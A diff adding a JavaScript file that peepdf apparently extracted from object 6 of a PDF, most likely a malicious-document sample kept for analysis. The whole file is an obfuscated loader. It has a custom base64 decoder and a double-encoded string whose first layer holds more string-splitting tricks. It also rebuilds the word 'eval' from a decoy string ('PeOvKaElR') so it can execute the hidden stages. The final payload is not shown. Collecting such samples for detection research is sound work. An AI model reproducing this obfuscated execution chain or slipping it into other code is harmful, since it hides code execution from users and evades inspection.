@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+
+function decode64(input) {
+    var output = "";
+    var chr1, chr2, chr3;
+    var enc1, enc2, enc3, enc4;
+    var i = 0;
+    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+    do {
+        enc1 = keyStr.indexOf(input.charAt(i++));
+        enc2 = keyStr.indexOf(input.charAt(i++));
+        enc3 = keyStr.indexOf(input.charAt(i++));
+        enc4 = keyStr.indexOf(input.charAt(i++));
+        chr1 = (enc1 << 2) | (enc2 >> 4);
+        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+        chr3 = ((enc3 & 3) << 6) | enc4;
+        output = output + String.fromCharCode(chr1);
+        if (enc3 != 64) {
+            output = output + String.fromCharCode(chr2);
+        }
+        if (enc4 != 64) {
+            output = output + String.fromCharCode(chr3);
+        }
+    } while (i < input.length);
+    return output;
+}
+
+var analyse = decode64("Q2dwaGJtRnNlWFJwWTNNOUluUWlLeUpvSWlzaWFYTWlPd29LZG1GeUlHNWxkM01nUFNBaUlqc0tDZ3AyWVhJZ1luSnZkM05sY25ZZ1BTQmhibUZzZVhScFkzTmJJbEJsTlhaWllUbHNjeUl1Y21Wd2JHRmpaU2d2VzFBMVdUbHpYRHBkTDJjc0lDSWlLVjA3Q2dvS2RtRnlJRzVoYm1Gc2VYTmxJRDBnSWlVaU93b0tDZ3BpY205M2MyVnlkaWdpWm1VaUt5SmhjeUlySW5jaUt5SnlQWFVpS3lKdUlpc2laU0lySW5NaUt5SmpZU0lySW5BaUt5SmxPeUlwT3dvS0NncGljbTkzYzJWeWRpZ2lZV0VpS3lKaVpTSXJJbmNnUFNCMGFDSXJJbWx6TG1raUt5SnVJaXNpWm04dWRHa2lLeUowYkdVN0lpazdDZ29LQ21KeWIzZHpaWEoyS0NKdUlpc2laU0lySW5jaUt5SnpJRDBnWVdFaUt5SmlJaXNpWlhjdWNtVWlLeUp3YkdFaUt5SmpaU2d2YVRGd05YQXliSE16Wmk5bkxHNGlLeUpoYmlJckltRWlLeUpzSWlzaWVYTWlLeUpsS1RzaUtUc0tDZ3BpY205M2MyVnlkaWdpZGlJckltRWlLeUp5SUhZaUt5SjJJaXNpYVc0aUt5SjBkaUE5SUdZaUt5SmxZU0lySW5NaUt5SjNjaWh1SWlzaVpTSXJJbmNpS3lKektUc2lLVHNLQ2dwaWNtOTNjMlZ5ZGlnaVlpSXJJbkp2ZHlJckluTmxJaXNpY25Zb2RpSXJJbllpS3lKcGJpSXJJblFpS3lKMktUc2lLVHNLQ2c9PQ==");
+
+newstv = "t" + "h" + "i" + "s";
+
+var oldtask = newstv["PeOvKaElR".replace(/[POKER\:]/g, "")];
+
+oldtask(decode64(analyse));
+
